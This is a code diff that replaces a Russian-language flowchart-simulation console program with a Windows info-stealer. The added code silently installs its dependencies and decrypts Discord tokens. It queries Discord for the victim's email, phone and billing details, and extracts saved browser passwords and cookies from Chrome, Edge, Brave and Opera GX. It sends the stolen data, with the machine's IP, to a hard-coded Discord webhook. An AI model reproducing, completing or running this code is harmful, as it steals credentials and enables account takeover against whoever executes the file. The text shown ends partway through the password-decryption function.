@@ -1,715 +1,521 @@
 import os
+if os.name != "nt":
+    exit()
+import subprocess
 import sys
-from enum import Enum
-from typing import List, Dict, Set, Tuple, Optional, Union, Any
-from abc import ABC, abstractmethod
-import platform
-
-# Утилиты для работы с консолью
-class ConsoleUI:
-    @staticmethod
-    def clear():
-        if platform.system() == "Windows":
-            os.system('cls')
-        else:
-            os.system('clear')
-
-    @staticmethod
-    def clear_and_draw_header(title: str):
-        ConsoleUI.clear()
-        ConsoleUI.draw_header(title)
-
-    @staticmethod
-    def draw_header(title: str):
-        safe_title = title if title else ""
-        print(safe_title)
-        print()
-
-    @staticmethod
-    def draw_info_box(message: str):
-        safe_message = message if message else ""
-        lines = safe_message.split('\n')
-        for line in lines:
-            print(line)
-        print()
-
-    @staticmethod
-    def draw_table(headers: List[str], rows: List[List[str]], max_width_for_last_col: int = -1):
-        if not headers or not rows:
-            return
-
-        cols = len(headers)
-        widths = [1] * cols
-
-        for c in range(cols):
-            max_len = len(headers[c])
-            for row in rows:
-                if c < len(row):
-                    cell = row[c] if row[c] else ""
-                    max_len = max(max_len, len(cell))
-            
-            if max_width_for_last_col > 0 and c == cols - 1:
-                max_len = min(max_len, max_width_for_last_col)
-            widths[c] = max(max_len, 1)
-
-        print(ConsoleUI._build_row(headers, widths))
-        for row in rows:
-            print(ConsoleUI._build_row(row, widths))
-
-    @staticmethod
-    def _repeat_string(s: str, n: int) -> str:
-        return s * n
-
-    @staticmethod
-    def _split(s: str, delimiter: str) -> List[str]:
-        return s.split(delimiter)
-
-    @staticmethod
-    def _build_row(cells: List[str], widths: List[int]) -> str:
-        result = []
-        for i, width in enumerate(widths):
-            cell = cells[i] if i < len(cells) else ""
-            if len(cell) > width:
-                cell = ConsoleUI._truncate(cell, width)
-            result.append(ConsoleUI._pad_right(cell, width))
-        return "  ".join(result)
-
-    @staticmethod
-    def _truncate(value: str, max_width: int) -> str:
-        if len(value) <= max_width:
-            return value
-        if max_width <= 1:
-            return value[:max_width]
-        if max_width == 2:
-            return value[:2]
-        return value[:max_width - 1] + "…"
-
-    @staticmethod
-    def _pad_right(s: str, width: int) -> str:
-        if len(s) >= width:
-            return s
-        return s + ' ' * (width - len(s))
-
-
-# Логическое значение условной вершины X
-class XValue(Enum):
-    NOT_STATED = -1
-    FALSE = 0
-    TRUE = 1
-
-
-# Базовый интерфейс вершины блок-схемы
-class ISchemeVertex(ABC):
-    @abstractmethod
-    def get_name(self) -> str:
-        pass
-
-    @abstractmethod
-    def get_next(self) -> Optional['ISchemeVertex']:
-        pass
-
-    @abstractmethod
-    def get_description(self) -> str:
-        pass
-
-
-# Операторная вершина Y
-class YVertex(ISchemeVertex):
-    def __init__(self, name: str):
-        self.name = name
-        self.next = None
-
-    def get_name(self) -> str:
-        return self.name
-
-    def get_next(self) -> Optional['ISchemeVertex']:
-        return self.next
-
-    def set_next(self, next_vertex: Optional['ISchemeVertex']):
-        self.next = next_vertex
-
-    def get_description(self) -> str:
-        return f"Пройдена операторная вершина {self.name}"
-
-
-# Начальная вершина
-class StartVertex(YVertex):
-    def __init__(self, name: str):
-        super().__init__(name)
-
-    def get_description(self) -> str:
-        return f"Пройдена начальная вершина {self.name}"
-
-
-# Конечная вершина
-class EndVertex(YVertex):
-    def __init__(self, name: str):
-        super().__init__(name)
-
-    def get_next(self) -> Optional['ISchemeVertex']:
-        return None
-
-    def get_description(self) -> str:
-        return f"Пройдена конечная вершина {self.name}"
-
-
-# Вспомогательная точка P
-class PVertex(ISchemeVertex):
-    def __init__(self, name: str):
-        self.name = name
-        self.next = None
-
-    def get_name(self) -> str:
-        return self.name
-
-    def get_next(self) -> Optional['ISchemeVertex']:
-        return self.next
-
-    def set_next(self, next_vertex: Optional['ISchemeVertex']):
-        self.next = next_vertex
-
-    def get_description(self) -> str:
-        return f"Пройдена точка {self.name}"
-
-
-# Условная вершина X
-class XVertex(ISchemeVertex):
-    def __init__(self, name: str):
-        self.name = name
-        self.value = XValue.NOT_STATED
-        self.lhs = None
-        self.rhs = None
-
-    def get_name(self) -> str:
-        return self.name
-
-    def get_next(self) -> Optional['ISchemeVertex']:
-        if self.value == XValue.FALSE:
-            return self.lhs
-        elif self.value == XValue.TRUE:
-            return self.rhs
-        else:
-            return None
-
-    def get_value(self) -> XValue:
-        return self.value
-
-    def set_value(self, val: XValue):
-        self.value = val
-
-    def get_lhs(self) -> Optional['ISchemeVertex']:
-        return self.lhs
-
-    def set_lhs(self, left: Optional['ISchemeVertex']):
-        self.lhs = left
-
-    def get_rhs(self) -> Optional['ISchemeVertex']:
-        return self.rhs
-
-    def set_rhs(self, right: Optional['ISchemeVertex']):
-        self.rhs = right
-
-    def get_description(self) -> str:
-        if self.value == XValue.TRUE:
-            val_str = "1"
-        elif self.value == XValue.FALSE:
-            val_str = "0"
-        else:
-            val_str = ""
-        
-        if not val_str:
-            return f"Пройдена условная вершина {self.name}"
-        return f"Пройдена условная вершина {self.name} (значение: {val_str})"
-
-
-# Блок-схема
-class Scheme:
-    class TraceResult:
-        def __init__(self, is_cycle: bool, trace: List[str]):
-            self.is_cycle = is_cycle
-            self.trace = trace
-
-    def __init__(self):
-        self.vertices = []
-        self.start = None
-        self.end = None
-        self.edge_ids = {}  # (from, to) -> id
-        self.edge_dirs = {}  # (from, to) -> 'U' or 'D'
-        self.cycle_detected = False
-
-    def get_vertices(self) -> List[ISchemeVertex]:
-        return self.vertices
-
-    def get_start(self) -> Optional[StartVertex]:
-        return self.start
-
-    def set_start(self, s: StartVertex):
-        self.start = s
-
-    def get_end(self) -> Optional[EndVertex]:
-        return self.end
-
-    def set_end(self, e: EndVertex):
-        self.end = e
-
-    def add_vertex(self, vertex: ISchemeVertex) -> ISchemeVertex:
-        self.vertices.append(vertex)
-        return vertex
-
-    def register_edge(self, from_vertex: ISchemeVertex, to_vertex: ISchemeVertex, edge_id: int, direction: str):
-        self.edge_ids[(from_vertex, to_vertex)] = edge_id
-        self.edge_dirs[(from_vertex, to_vertex)] = direction
-
-    def connect(self, from_vertex: ISchemeVertex, to_vertex: ISchemeVertex, 
-                edge_id: Optional[int] = None, direction: Optional[str] = None) -> 'Scheme':
-        if not to_vertex:
-            raise ValueError("Целевая вершина не может быть None")
-
-        if isinstance(from_vertex, EndVertex):
-            raise RuntimeError("Нельзя соединять после конечной вершины.")
-        elif isinstance(from_vertex, YVertex):
-            from_vertex.set_next(to_vertex)
-        elif isinstance(from_vertex, PVertex):
-            from_vertex.set_next(to_vertex)
-        else:
-            raise RuntimeError("Неизвестный тип вершины для соединения.")
-
-        if edge_id is not None and direction is not None:
-            self.register_edge(from_vertex, to_vertex, edge_id, direction)
-
-        return self
-
-    def connect_x(self, x: XVertex, lhs: ISchemeVertex, rhs: ISchemeVertex, 
-                  lhs_id: Optional[int] = None, lhs_dir: Optional[str] = None,
-                  rhs_id: Optional[int] = None, rhs_dir: Optional[str] = None) -> 'Scheme':
-        x.set_lhs(lhs)
-        x.set_rhs(rhs)
-        
-        if lhs_id is not None and lhs_dir is not None:
-            self.register_edge(x, lhs, lhs_id, lhs_dir)
-        if rhs_id is not None and rhs_dir is not None:
-            self.register_edge(x, rhs, rhs_id, rhs_dir)
-            
-        return self
-
-    def get_conditionals(self) -> List[XVertex]:
-        result = []
-        for vertex in self.vertices:
-            if isinstance(vertex, XVertex):
-                result.append(vertex)
-        return result
-
-    def reset_conditions(self):
-        for x in self.get_conditionals():
-            x.set_value(XValue.NOT_STATED)
-
-    def validate(self):
-        errors = []
-
-        if not self.start:
-            errors.append("Не задана начальная вершина (Start).")
-        if not self.end:
-            errors.append("Не задана конечная вершина (End).")
-
-        if self.start and self.start not in self.vertices:
-            errors.append("Начальная вершина не добавлена в список вершин схемы.")
-        if self.end and self.end not in self.vertices:
-            errors.append("Конечная вершина не добавлена в список вершин схемы.")
-
-        if self.end and self.end.get_next():
-            errors.append("У конечной вершины (Yк) не должно быть следующей вершины.")
-
-        for x in self.get_conditionals():
-            if not x.get_lhs():
-                errors.append(f"У условной вершины {x.get_name()} не задана ветвь LHS (False).")
-            if not x.get_rhs():
-                errors.append(f"У условной вершины {x.get_name()} не задана ветвь RHS (True).")
-            if x.get_lhs() and x.get_lhs() not in self.vertices:
-                errors.append(f"Ветвь LHS вершины {x.get_name()} указывает на вершину, отсутствующую в схеме.")
-            if x.get_rhs() and x.get_rhs() not in self.vertices:
-                errors.append(f"Ветвь RHS вершины {x.get_name()} указывает на вершину, отсутствующую в схеме.")
-
-        for vertex in self.vertices:
-            if isinstance(vertex, YVertex) and not isinstance(vertex, EndVertex):
-                if not vertex.get_next():
-                    errors.append(f"У вершины {vertex.get_name()} (Y) не задан Next.")
-                elif vertex.get_next() not in self.vertices:
-                    errors.append(f"Next вершины {vertex.get_name()} указывает на вершину, отсутствующую в схеме.")
-            elif isinstance(vertex, PVertex):
-                if not vertex.get_next():
-                    errors.append(f"У вершины {vertex.get_name()} (P) не задан Next.")
-                elif vertex.get_next() not in self.vertices:
-                    errors.append(f"Next вершины {vertex.get_name()} указывает на вершину, отсутствующую в схеме.")
-
-        if self.start:
-            if any(v.get_next() == self.start for v in self.vertices 
-                   if isinstance(v, (YVertex, PVertex))):
-                errors.append("В начальную вершину (Start) не должно входить ребро от Y или P.")
-            
-            if any(x.get_lhs() == self.start or x.get_rhs() == self.start 
-                   for x in self.get_conditionals()):
-                errors.append("В начальную вершину (Start) не должно входить ребро от X.")
-
-        if self.start:
-            reachable = set()
-            stack = [self.start]
-
-            while stack:
-                current = stack.pop()
-                if current in reachable:
-                    continue
-                reachable.add(current)
-
-                if isinstance(current, YVertex):
-                    if current.get_next():
-                        stack.append(current.get_next())
-                elif isinstance(current, PVertex):
-                    if current.get_next():
-                        stack.append(current.get_next())
-                elif isinstance(current, XVertex):
-                    if current.get_lhs():
-                        stack.append(current.get_lhs())
-                    if current.get_rhs():
-                        stack.append(current.get_rhs())
-
-            for vertex in self.vertices:
-                if vertex not in reachable:
-                    errors.append(f"Вершина {vertex.get_name()} недостижима из Start.")
-
-            if self.end and self.end not in reachable:
-                errors.append("Конечная вершина (End) недостижима из Start.")
-
-        if errors:
-            error_msg = "Ошибки валидации схемы:\n- " + "\n- ".join(errors)
-            raise RuntimeError(error_msg)
-
-    def build_lsa_trace(self) -> str:
-        parts = []
-        if not self.start:
-            return ""
-
-        current = self.start
-        parts.append(current.get_name())
-
-        seen = {current: 0}
-
-        while current and not isinstance(current, EndVertex):
-            if isinstance(current, XVertex):
-                if current.get_value() == XValue.NOT_STATED:
-                    break
-
-            next_vertex = self._resolve_next(current)
-            if not next_vertex:
-                break
-
-            key = (current, next_vertex)
-            edge_id = self.edge_ids.get(key)
-            edge_dir = self.edge_dirs.get(key)
-            
-            if edge_id is not None and edge_dir is not None:
-                if edge_dir == 'D':
-                    parts.append(f"w^{edge_id}")
-                    parts.append(f"v{edge_id}")
-                else:
-                    parts.append(f"^{edge_id}")
-
-            current = next_vertex
-            parts.append(current.get_name())
-
-            if current in seen:
-                break
-            seen[current] = len(seen)
-
-        return " ".join(parts)
-
-    def run_m1(self):
-        self._ensure_ready()
-        ConsoleUI.clear_and_draw_header("Режим 1 (последовательный ввод значений)")
-
-        self.reset_conditions()
-
-        xs_all = self.get_conditionals()
-        by_name = {x.get_name(): x for x in xs_all}
-
-        order = ["P0", "X0", "X1", "X2"]
-        ordered = []
-        for name in order:
-            if name in by_name:
-                ordered.append(by_name[name])
-
-        remaining = [x for x in xs_all if x not in ordered]
-        remaining.sort(key=lambda x: x.get_name())
-        ordered.extend(remaining)
-
-        for xv in ordered:
-            b = self._read_bool_for_x(xv)
-            xv.set_value(XValue.TRUE if b else XValue.FALSE)
-
-            print(f"\nВыполняемые шаги после ввода {xv.get_name()} = {1 if b else 0}:")
-            self._execute_with_console(False)
-            if self.cycle_detected:
-                print("\nВвод значений прекращён: обнаружен цикл.")
-                break
-
-        self.reset_conditions()
-
-    def run_m2(self):
-        self._ensure_ready()
-        ConsoleUI.clear_and_draw_header("Режим 2 (разовый ввод всех условий)")
-        
-        xs = self.get_conditionals()
-        xs.sort(key=lambda x: x.get_name())
-
-        print("Введите значения для ", end="")
-        names = [x.get_name() for x in xs]
-        print(", ".join(names), end="")
-        print(" (0/1) одним вводом (например: 0100)")
-
-        while True:
-            user_input = input("> ").replace(" ", "")
-            
-            if len(user_input) != len(xs):
-                print(f"Количество значений должно быть {len(xs)}. Попробуйте снова.")
-                continue
-
-            valid = True
-            for i, char in enumerate(user_input):
-                if char == '0':
-                    xs[i].set_value(XValue.FALSE)
-                elif char == '1':
-                    xs[i].set_value(XValue.TRUE)
-                else:
-                    valid = False
-                    break
-
-            if not valid:
-                print("Допустимы только 0 и 1. Попробуйте снова.")
-                continue
-            break
-
-        combo = ''.join(['1' if x.get_value() == XValue.TRUE else '0' for x in xs])
-        lsa = self.build_lsa_trace()
-        print(f"\nКомбинация | Ход работы алгоритма")
-        print(f"{combo} | {lsa}")
-        self.reset_conditions()
-
-    def run_m3(self):
-        self._ensure_ready()
-        ConsoleUI.clear_and_draw_header("Режим 3 (полный перебор всех комбинаций)")
-        
-        xs_sorted = self.get_conditionals()
-        xs_sorted.sort(key=lambda x: x.get_name())
-
-        k = len(xs_sorted)
-        total = 1 << k
-
-        col_left_title = "Комбинация"
-        col_right_title = "Ход работы алгоритма"
-        col_left_width = len(col_left_title)
-
-        print(f"{col_left_title} | {col_right_title}")
-
-        path_count = 0
-        cycle_count = 0
-
-        for mask in range(total):
-            for i in range(k):
-                shift = k - 1 - i
-                bit = (mask >> shift) & 1
-                xs_sorted[i].set_value(XValue.TRUE if bit else XValue.FALSE)
-
-            lsa = self.build_lsa_trace()
-            combo_str = ''.join(['1' if x.get_value() == XValue.TRUE else '0' for x in xs_sorted])
-
-            print(f"{combo_str:<{col_left_width}} | {lsa}")
-
-            result = self._trace_once_for_m3()
-            if result.is_cycle:
-                cycle_count += 1
-            else:
-                path_count += 1
-            self.reset_conditions()
-
-        print()
-
-    def _contains_vertex(self, vertex: ISchemeVertex) -> bool:
-        return vertex in self.vertices
-
-    def _resolve_next(self, vertex: ISchemeVertex) -> Optional[ISchemeVertex]:
-        return vertex.get_next()
-
-    def _read_bool_for_x(self, x: XVertex) -> bool:
-        while True:
-            user_input = input(f"Введите значение для {x.get_name()} (0/1): ").replace(" ", "")
-            if user_input == "0":
-                return False
-            elif user_input == "1":
-                return True
-            else:
-                print("Некорректный ввод. Введите 0 или 1.")
-
-    def _ensure_ready(self):
-        if not self.start or not self.end:
-            raise RuntimeError("Не задана начальная или конечная вершина.")
-        self.validate()
-
-    def _compare_x_names(self, a: XVertex, b: XVertex) -> int:
-        return (a.get_name() > b.get_name()) - (a.get_name() < b.get_name())
-
-    def _trace_once_for_m3(self) -> 'Scheme.TraceResult':
-        names = []
-        index_map = {}
-
-        current = self.start
-        step = 0
-
-        while current:
-            if isinstance(current, XVertex):
-                if current.get_value() == XValue.NOT_STATED:
-                    break
-
-            if current in index_map:
-                cycle_vertices = self._extract_cycle_vertices_for_m3(current)
-                final_seq = names[:index_map[current]]
-                final_seq.extend(cycle_vertices)
-                final_seq.extend(cycle_vertices)
-                return Scheme.TraceResult(True, final_seq)
-
-            index_map[current] = step
-            names.append(current.get_name())
-            step += 1
-
-            if isinstance(current, EndVertex):
-                break
-            current = self._resolve_next(current)
-
-        return Scheme.TraceResult(False, names)
-
-    def _extract_cycle_vertices_for_m3(self, start_vertex: ISchemeVertex) -> List[str]:
-        vertices_list = []
-        seen = set()
-        v = start_vertex
-
-        while v and v not in seen:
-            seen.add(v)
-            vertices_list.append(v.get_name())
-            v = self._resolve_next(v)
-        return vertices_list
-
-    def _execute_with_console(self, interactive: bool):
-        self.cycle_detected = False
-        visited_index = {}
-        current = self.start
-        step = 0
-
-        while current:
-            if current not in visited_index:
-                visited_index[current] = step
-                step += 1
-
-                if isinstance(current, XVertex):
-                    if interactive and current.get_value() == XValue.NOT_STATED:
-                        b = self._read_bool_for_x(current)
-                        current.set_value(XValue.TRUE if b else XValue.FALSE)
-                    print(current.get_description())
-                else:
-                    print(current.get_description())
-
-                if isinstance(current, EndVertex):
-                    break
-                current = self._resolve_next(current)
-            else:
-                cycle_vertices = self._extract_cycle_vertices_for_console(current)
-                to_print = len(cycle_vertices)
-                printed = 0
-                v = current
-
-                while printed < to_print and v:
-                    if isinstance(v, XVertex):
-                        print(v.get_description())
-                    else:
-                        print(v.get_description())
-                    printed += 1
-                    v = self._resolve_next(v)
-
-                self.cycle_detected = True
-                ConsoleUI.draw_info_box("Обнаружен цикл!")
-                return
-
-    def _extract_cycle_vertices_for_console(self, start_vertex: ISchemeVertex) -> List[ISchemeVertex]:
-        vertices_list = []
-        seen = set()
-        v = start_vertex
-
-        while v and v not in seen:
-            seen.add(v)
-            vertices_list.append(v)
-            v = self._resolve_next(v)
-        return vertices_list
-
-
-# Главная функция
-def main():
-    scheme = Scheme()
-
-    # Создание вершин
-    yn = scheme.add_vertex(StartVertex("Yн"))
-    y0 = scheme.add_vertex(YVertex("Y0"))
-    y1 = scheme.add_vertex(YVertex("Y1"))
-    y2 = scheme.add_vertex(YVertex("Y2"))
-    p0 = scheme.add_vertex(XVertex("P0"))
-    x0 = scheme.add_vertex(XVertex("X0"))
-    x1 = scheme.add_vertex(XVertex("X1"))
-    x2 = scheme.add_vertex(XVertex("X2"))
-    yk = scheme.add_vertex(EndVertex("Yк"))
-
-    scheme.set_start(yn)
-    scheme.set_end(yk)
-
-    # Прямой ход сверху вниз (ребра 1,2,3):
-    scheme.connect(yn, y0, 1, 'D')
-    scheme.connect(y0, y1, 2, 'D')
-    scheme.connect(y1, y2, 3, 'D')
-    scheme.connect(y2, p0)  # без номера
-
-    # P0: 0 -> X0, 1 -> X1
-    scheme.connect_x(p0, x0, x1, 4, 'U', 5, 'D')
-
-    # X0: 0 -> P0, 1 -> X1
-    scheme.connect_x(x0, p0, x1, 4, 'U', 5, 'D')
-
-    # X1: 0 -> X2, 1 -> Y0
-    scheme.connect_x(x1, x2, y0, 6, 'D', 2, 'U')
-
-    # X2: 0 -> Y0, 1 -> Yк
-    scheme.connect_x(x2, y0, yk)
-    scheme.register_edge(x2, y0, 1, 'U')
-
-    while True:
-        ConsoleUI.clear_and_draw_header("Выберите режим:")
-        print("1 - Последовательный ввод(P0,X0,X1,X2)")
-        print("2 - Ввод сразу всех значений")
-        print("3 - Вывод всех возможных комбинаций")
-        print("0 - Выход")
-        choice = input("Ваш выбор: ").strip()
+import json
+import urllib.request
+import re
+import base64
+import datetime
+import sqlite3
+import requests
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+import glob
+from typing import List, Dict
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+PATHS = {
+    'Discord': os.getenv("APPDATA") + '\\discord',
+    'Discord Canary': os.getenv("APPDATA") + '\\discordcanary',
+    'Lightcord': os.getenv("APPDATA") + '\\Lightcord',
+    'Discord PTB': os.getenv("APPDATA") + '\\discordptb',
+    'Opera': os.getenv("APPDATA") + '\\Opera Software\\Opera Stable',
+    'Opera GX': os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable',
+    'Amigo': os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data',
+    'Torch': os.getenv("LOCALAPPDATA") + '\\Torch\\User Data',
+    'Kometa': os.getenv("LOCALAPPDATA") + '\\Kometa\\User Data',
+    'Orbitum': os.getenv("LOCALAPPDATA") + '\\Orbitum\\User Data',
+    'CentBrowser': os.getenv("LOCALAPPDATA") + '\\CentBrowser\\User Data',
+    '7Star': os.getenv("LOCALAPPDATA") + '\\7Star\\7Star\\User Data',
+    'Sputnik': os.getenv("LOCALAPPDATA") + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': os.getenv("LOCALAPPDATA") + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
+    'Epic Privacy Browser': os.getenv("LOCALAPPDATA") + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': os.getenv("LOCALAPPDATA") + '\\Microsoft\\Edge\\User Data\\Default',
+    'Uran': os.getenv("LOCALAPPDATA") + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': os.getenv("LOCALAPPDATA") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': os.getenv("LOCALAPPDATA") + '\\Iridium\\User Data\\Default'
+}
+
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
 
         try:
-            if choice == "1":
-                scheme.run_m1()
-            elif choice == "2":
-                scheme.run_m2()
-            elif choice == "3":
-                scheme.run_m3()
-            elif choice == "0":
-                break
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    try:
+        with open(path + "\\Local State", "r") as file:
+            key = json.loads(file.read())['os_crypt']['encrypted_key']
+            file.close()
+        return key
+    except:
+        return None
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+class AdvancedStealer:
+    def __init__(self):
+        self.webhook_url = "https://canary.discord.com/api/webhooks/1420906443799793838/L4jrzp19UGxyvrBgCd9Mz_zYivxLgTOONK-0ptNIT0ywZ4k4ThycR22CuX36MGtAeyXA"
+        self.browsers = {
+            'Chrome': {
+                'paths': [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+                ],
+                'profiles': ['Default', 'Profile *']
+            },
+            'Microsoft Edge': {
+                'paths': [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+                ],
+                'profiles': ['Default', 'Profile *']
+            },
+            'Brave': {
+                'paths': [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
+                ],
+                'profiles': ['Default', 'Profile *']
+            },
+            'Opera GX': {
+                'paths': [
+                    os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
+                ],
+                'profiles': ['']
+            }
+        }
+        
+    def run(self):
+        self.detailed_discord_grabber()
+        
+        pc_name = os.getenv('USERNAME')
+        all_passwords = self.get_all_browser_passwords()
+        cookies = self.get_all_browser_cookies()
+        
+        self.send_passwords_cookies_embed(pc_name, all_passwords, cookies)
+    
+    def detailed_discord_grabber(self):
+        checked = []
+
+        for platform, path in PATHS.items():
+            if not os.path.exists(path):
+                continue
+
+            for token in gettokens(path):
+                token = token.replace("\\", "") if token.endswith("\\") else token
+
+                try:
+                    key_data = getkey(path)
+                    if not key_data:
+                        continue
+                    
+                    encrypted_key = base64.b64decode(key_data)[5:]
+                    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    
+                    encrypted_token = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
+                    iv = encrypted_token[3:15]
+                    payload = encrypted_token[15:]
+                    
+                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                    decrypted_token = cipher.decrypt(payload)[:-16].decode()
+                    
+                    if decrypted_token in checked:
+                        continue
+                    checked.append(decrypted_token)
+
+                    res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(decrypted_token)))
+                    if res.getcode() != 200:
+                        continue
+                    
+                    res_json = json.loads(res.read().decode())
+
+                    badges = ""
+                    flags = res_json.get('flags', 0)
+                    if flags == 64 or flags == 96:
+                        badges += "Bravery "
+                    if flags == 128 or flags == 160:
+                        badges += "Brilliance "
+                    if flags == 256 or flags == 288:
+                        badges += "Balance "
+
+                    guilds_info = ""
+                    try:
+                        params = urllib.parse.urlencode({"with_counts": True})
+                        guilds_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discord.com/api/v10/users/@me/guilds?{params}', headers=getheaders(decrypted_token))).read().decode())
+                        guild_count = len(guilds_res)
+                        
+                        for guild in guilds_res[:5]: 
+                            if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
+                                guilds_info += f"\n- {guild.get('name', 'Unknown')} ({guild.get('approximate_member_count', 'N/A')} members)"
+                    except:
+                        guild_count = 0
+                        guilds_info = "N/A"
+
+                    nitro_info = "No"
+                    boost_info = "No boosts"
+                    try:
+                        nitro_res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/billing/subscriptions', headers=getheaders(decrypted_token))).read().decode())
+                        if nitro_res:
+                            nitro_info = "Yes"
+                            boost_res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/guilds/premium/subscription-slots', headers=getheaders(decrypted_token))).read().decode())
+                            if boost_res:
+                                boost_count = len([b for b in boost_res if datetime.datetime.strptime(b.get("cooldown_ends_at", "2000-01-01T00:00:00.000000+00:00"), "%Y-%m-%dT%H:%M:%S.%f%z") < datetime.datetime.now(datetime.timezone.utc)])
+                                boost_info = f"{boost_count} boosts available"
+                    except:
+                        pass
+
+                    embed = {
+                        "title": f"🎯 Discord Token Found - {res_json.get('username', 'Unknown')}",
+                        "color": 0x800080,
+                        "fields": [
+                            {"name": "👤 User", "value": f"{res_json.get('username', 'Unknown')}#{res_json.get('discriminator', '0000')}", "inline": True},
+                            {"name": "🆔 ID", "value": res_json.get('id', 'Unknown'), "inline": True},
+                            {"name": "📧 Email", "value": res_json.get('email', 'Not set'), "inline": True},
+                            {"name": "📞 Phone", "value": res_json.get('phone', 'Not set'), "inline": True},
+                            {"name": "🛡️ Badges", "value": badges if badges else "None", "inline": True},
+                            {"name": "💰 Nitro", "value": nitro_info, "inline": True},
+                            {"name": "🚀 Boosts", "value": boost_info, "inline": True},
+                            {"name": "🌐 Servers", "value": f"{guild_count} servers", "inline": True},
+                            {"name": "📍 Source", "value": platform, "inline": True},
+                            {"name": "🔑 Token", "value": f"```{decrypted_token}```", "inline": False}
+                        ],
+                        "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{res_json.get('id', '')}/{res_json.get('avatar', '')}.png?size=1024"} if res_json.get('avatar') else {},
+                        "footer": {"text": f"IP: {getip()} | PC: {os.getenv('COMPUTERNAME', 'Unknown')}"}
+                    }
+
+                    data = {"embeds": [embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
+                    requests.post(self.webhook_url, json=data, timeout=30)
+
+                except Exception as e:
+                    continue
+        
+    def get_all_browser_passwords(self) -> Dict[str, List[Dict]]:
+        all_passwords = {}
+        
+        for browser_name, browser_info in self.browsers.items():
+            browser_passwords = []
+            
+            for base_path in browser_info['paths']:
+                if os.path.exists(base_path):
+                    for profile in browser_info['profiles']:
+                        try:
+                            if '*' in profile:
+                                profile_dirs = glob.glob(os.path.join(base_path, profile))
+                            else:
+                                profile_dirs = [os.path.join(base_path, profile)]
+                            
+                            for profile_dir in profile_dirs:
+                                if os.path.exists(profile_dir):
+                                    passwords = self.get_browser_passwords(browser_name, profile_dir)
+                                    if passwords:
+                                        browser_passwords.extend(passwords)
+                        
+                        except Exception as e:
+                            continue
+            
+            if browser_passwords:
+                all_passwords[browser_name] = browser_passwords
+        
+        return all_passwords
+    
+    def get_browser_passwords(self, browser_name: str, profile_path: str) -> List[Dict]:
+        passwords = []
+        
+        try:
+            login_data_path = os.path.join(profile_path, 'Login Data')
+            
+            if os.path.exists(login_data_path):
+                temp_file = os.path.join(os.getenv('TEMP'), f'{browser_name}_temp.db')
+                
+                try:
+                    shutil.copy2(login_data_path, temp_file)
+                except Exception as e:
+                    return passwords
+                
+                try:
+                    conn = sqlite3.connect(temp_file)
+                    cursor = conn.cursor()
+                    
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    
+                    for url, username, encrypted_password in cursor.fetchall():
+                        try:
+                            if encrypted_password:  
+                                decrypted_password = self.decrypt_password(encrypted_password, browser_name, profile_path)
+                                
+                                if decrypted_password and decrypted_password != "Non decifrabile":
+                                    passwords.append({
+                                        'url': url or 'N/A',
+                                        'username': username or 'N/A',
+                                        'password': decrypted_password,
+                                        'profile': os.path.basename(profile_path)
+                                    })
+                        
+                        except Exception as e:
+                            continue
+                    
+                    conn.close()
+                
+                except Exception as e:
+                    pass
+                
+                finally:
+                    try:
+                        os.remove(temp_file)
+                    except:
+                        pass
+        
+        except Exception as e:
+            pass
+        
+        return passwords
+    
+    def decrypt_password(self, encrypted_password: bytes, browser_name: str, profile_path: str) -> str:
+        try:
+            if not encrypted_password or len(encrypted_password) == 0:
+                return ""
+            
